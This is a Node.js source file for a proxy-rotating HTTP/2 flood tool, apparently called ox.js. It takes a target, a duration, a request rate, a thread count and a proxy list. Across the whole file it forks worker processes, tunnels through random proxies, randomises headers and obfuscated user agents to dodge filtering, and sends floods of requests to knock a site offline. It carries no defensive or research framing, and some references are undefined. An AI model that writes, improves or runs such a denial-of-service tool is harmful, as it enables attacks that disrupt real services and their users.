const net = require('net'),
  http2 = require('http2'),
  tls = require('tls'),
  cluster = require('cluster'),
  url = require('url'),
  crypto = require('crypto'),
  fs = require('fs')
lang_header = [
  'pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7',
  'es-ES,es;q=0.9,gl;q=0.8,ca;q=0.7',
  'ja-JP,ja;q=0.9,en-US;q=0.8,en;q=0.7',
  'ko-KR,ko;q=0.9,en-US;q=0.8,en;q=0.7',
  'ru-RU,ru;q=0.9,en-US;q=0.8,en;q=0.7',
  'zh-TW,zh-CN;q=0.9,zh;q=0.8,en-US;q=0.7,en;q=0.6',
  'nl-NL,nl;q=0.9,en-US;q=0.8,en;q=0.7',
  'fi-FI,fi;q=0.9,en-US;q=0.8,en;q=0.7',
  'sv-SE,sv;q=0.9,en-US;q=0.8,en;q=0.7',
  'he-IL,he;q=0.9,en-US;q=0.8,en;q=0.7',
  'fr-CH, fr;q=0.9, en;q=0.8, de;q=0.7, *;q=0.5',
  'en-US,en;q=0.5',
  'en-US,en;q=0.9',
  'de-CH;q=0.7',
  'da, en-gb;q=0.8, en;q=0.7',
  'tr-TR,tr;q=0.9,en-US;q=0.8,en;q=0.7',
]
encoding_header = [
  'gzip, deflate, br',
  'compress, gzip',
  'deflate, gzip',
  'gzip, identity',
  '*',
]
process.setMaxListeners(0)
require('events').EventEmitter.defaultMaxListeners = 0
process.on('uncaughtException', function (_0x3e93a5) {})
process.argv.length < 7 &&
  (console.log('node ox.js target time rate thread proxy.txt'), process.exit())
const headers = {}
function readLines(filePath) {
  return fs.readFileSync(filePath, 'utf-8').toString().split(/\r?\n/);
}

function randomIntn(min, max) {
  return Math.floor(Math.random() * (max - min) + min);
}

function randomElement(array) {
  return array[randomIntn(0, array.length)];
}

const args = {
  target: process.argv[2],
  time: ~~process.argv[3],
  Rate: ~~process.argv[4],
  threads: ~~process.argv[5],
  proxyFile: process.argv[6],
}
var proxies = readLines(args.proxyFile)
const parsedTarget = url.parse(args.target)
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork()
  }
  console.clear()
  console.log(
    '\x1B[1m\x1B[34mTarget: \x1B[0m\x1B[1m' + parsedTarget.host + '\x1B[0m'
  )
  console.log('\x1B[1m\x1B[33mDuration: \x1B[0m\x1B[1m' + args.time + '\x1B[0m')
  console.log(
    '\x1B[1m\x1B[32mThreads: \x1B[0m\x1B[1m' + args.threads + '\x1B[0m'
  )
  console.log(
    '\x1B[1m\x1B[31mRequests per second: \x1B[0m\x1B[1m' + args.Rate + '\x1B[0m'
  )
  setTimeout(() => {
    process.exit(1)
  }, process.argv[3] * 1000)
}
if (cluster.isMaster) {
  for (let counter = 1; counter <= args.threads; counter++) {
    cluster.fork()
  }
} else {
  setInterval(runFlooder)
}
setTimeout(function () {
  process.exit(1)
}, process.argv[3] * 1000)
process.on('uncaughtException', function (error) {
});

process.on('unhandledRejection', function (reason) {
});

class NetSocket {
  constructor() {}

  HTTP(socket, callback) {
    const addressParts = socket.address.split(':');
    const host = addressParts[0];
    const request = `CONNECT ${socket.address}:443 HTTP/1.1\r\nHost: ${socket.address}:443\r\nConnection: Keep-Alive\r\n\r\n`;
    const buffer = Buffer.from(request);
    const clientSocket = net.connect({
      host: socket.host,
      port: socket.port,
      allowHalfOpen: true,
      writable: true,
      readable: true,
    });

    clientSocket.setTimeout(socket.timeout * 10 * 10000);

    clientSocket.on('connect', () => {
      clientSocket.write(buffer);
    });

    clientSocket.on('data', (data) => {
      const response = data.toString('utf-8');
      const success = response.includes('HTTP/1.1 200');

      if (!success) {
        clientSocket.destroy();
        callback(undefined, 'error: invalid response from proxy server');
      } else {
        callback(clientSocket, undefined);
      }
    });

    clientSocket.on('timeout', () => {
      clientSocket.destroy();
      callback(undefined, 'error: timeout exceeded');
    });
  }
}

function getRandomUserAgent() {
  const operatingSystems = [
      'Windows NT 10.0',
      'Windows NT 6.1',
      'Windows NT 6.3',
      'Macintosh',
      'Android',
      'Linux',
    ],
    browsers = ['Chrome', 'Firefox', 'Safari', 'Edge', 'Opera'],
    languages = ['en-US', 'en-GB', 'fr-FR', 'de-DE', 'es-ES'],
    countries = ['US', 'GB', 'FR', 'DE', 'ES'],
    vendors = ['Apple', 'Google', 'Microsoft', 'Mozilla', 'Opera Software'];

  const randomOS = operatingSystems[Math.floor(Math.random() * operatingSystems.length)];
  const randomBrowser = browsers[Math.floor(Math.random() * browsers.length)];
  const randomLanguage = languages[Math.floor(Math.random() * languages.length)];
  const randomCountry = countries[Math.floor(Math.random() * countries.length)];
  const randomVendor = vendors[Math.floor(Math.random() * vendors.length)];

  const versionNumber = Math.floor(Math.random() * 100) + 1;
  const caseChangeFrequency = Math.floor(Math.random() * 6) + 1;

  const userAgentString =
    randomVendor +
    '/' +
    randomBrowser +
    ' ' +
    versionNumber +
    '.' +
    versionNumber +
    '.' +
    versionNumber +
    ' (' +
    randomOS +
    '; ' +
    randomCountry +
    '; ' +
    randomLanguage +
    ')';
  
  const base64Encoded = btoa(userAgentString);

  let finalUserAgent = '';
  for (let i = 0; i < base64Encoded.length; i++) {
    i % caseChangeFrequency === 0
      ? (finalUserAgent += base64Encoded.charAt(i))
      : (finalUserAgent += base64Encoded.charAt(i).toUpperCase());
  }

  return finalUserAgent;
}

const Header = new NetSocket()
headers[':method'] = 'GET'
headers[':path'] = parsedTarget.path
headers[':scheme'] = 'https'
headers[':authority'] = randomString(10) + '.' + parsedTarget.host
headers.accept = randomHeaders.accept
headers['Accept-Encoding'] = 'gzip, deflate, br'
headers['accept-language'] = headerFunc.lang()
headers['accept-encoding'] = headerFunc.encoding()
headers.Connection = Math.random() > 0.5 ? 'keep-alive' : 'close'
headers['upgrade-insecure-requests'] = Math.random() > 0.5
headers['x-requested-with'] = 'XMLHttpRequest'
headers.pragma = Math.random() > 0.5 ? 'no-cache' : 'max-age=0'
headers['cache-control'] = Math.random() > 0.5 ? 'no-cache' : 'max-age=0'
function runFlooder() {
  const selectedProxy = randomElement(proxies);
  const proxyParts = selectedProxy.split(':');

  headers[':authority'] = parsedTarget.host;
  headers['user-agent'] = getRandomUserAgent();

  const connectionDetails = {
    host: proxyParts[0],
    port: ~~proxyParts[1],
    address: parsedTarget.host + ':443',
    timeout: 100,
  };

  Header.HTTP(connectionDetails, (clientSocket, error) => {
    if (error) {
      return;
    }

    clientSocket.setKeepAlive(true, 60000);

    const tlsOptions = {
      ALPNProtocols: ['h2', 'http/1.1'],
      echdCurve: 'GREASE:X25519:x25519',
      ciphers: 'TLS_AES_256_GCM_SHA384:TLS_CHACHA20_POLY1305_SHA256:TLS_AES_128_GCM_SHA256:ECDHE-ECDSA-AES128-GCM-SHA256:ECDHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES256-GCM-SHA384:ECDHE-RSA-AES256-GCM-SHA384:DHE-RSA-AES128-GCM-SHA256:ECDHE-ECDSA-AES128-SHA256:ECDHE-RSA-AES128-SHA256:ECDHE-ECDSA-AES256-SHA384:ECDHE-RSA-AES256-SHA384:DHE-RSA-AES128-SHA256:DHE-RSA-AES256-SHA256:HIGH:!aNULL:!eNULL:!EXPORT:!DES:!RC4:!MD5:!PSK:!SRP:!CAMELLIA',
      rejectUnauthorized: false,
      socket: clientSocket,
      honorCipherOrder: true,
      secure: true,
      port: 443,
      uri: parsedTarget.host,
      servername: parsedTarget.host,
      secureProtocol: ['TLSv1_1_method', 'TLSv1_2_method', 'TLSv1_3_method'],
      secureOptions: crypto.constants.SSL_OP_NO_SESSION_RESUMPTION_ON_RENEGOTIATION |
                     crypto.constants.SSL_OP_NO_TICKET |
                     crypto.constants.SSL_OP_NO_COMPRESSION |
                     crypto.constants.SSL_OP_CIPHER_SERVER_PREFERENCE |
                     crypto.constants.SSL_OP_NO_SSLv2 |
                     crypto.constants.SSL_OP_NO_SSLv3 |
                     crypto.constants.SSL_OP_NO_TLSv1 |
                     crypto.constants.SSL_OP_NO_TLSv1_1,
    };

    const tlsSocket = tls.connect(443, parsedTarget.host, tlsOptions);
    tlsSocket.setKeepAlive(true, 600000);

    const http2Session = http2.connect(parsedTarget.href, {
      protocol: 'https:',
      settings: {
        headerTableSize: 65536,
        maxConcurrentStreams: 20000,
        initialWindowSize: 62914560,
        maxHeaderListSize: 2621440,
        enablePush: false,
      },
      maxSessionMemory: 64000,
      maxDeflateDynamicTableSize: 4294967295,
      createConnection: () => tlsSocket,
      socket: clientSocket,
    });

    http2Session.settings({
      headerTableSize: 65536,
      maxConcurrentStreams: 1000,
      initialWindowSize: 6291456,
      maxHeaderListSize: 262144,
      enablePush: false,
    });

    http2Session.on('connect', () => {
      const requestInterval = setInterval(() => {
        for (let i = 0; i < args.Rate; i++) {
          const request = http2Session
            .request(headers)
            .on('response', (response) => {
              request.close();
              request.destroy();
              return;
            });
          request.end();
        }
      }, 1000);
    });

    http2Session.on('close', () => {
      http2Session.destroy();
      clientSocket.destroy();
      return;
    });

    http2Session.on('error', (error) => {
      http2Session.destroy();
      clientSocket.destroy();
      return;
    });
  });
}

const KillScript = () => process.exit(1)
setTimeout(KillScript, args.time * 1000)
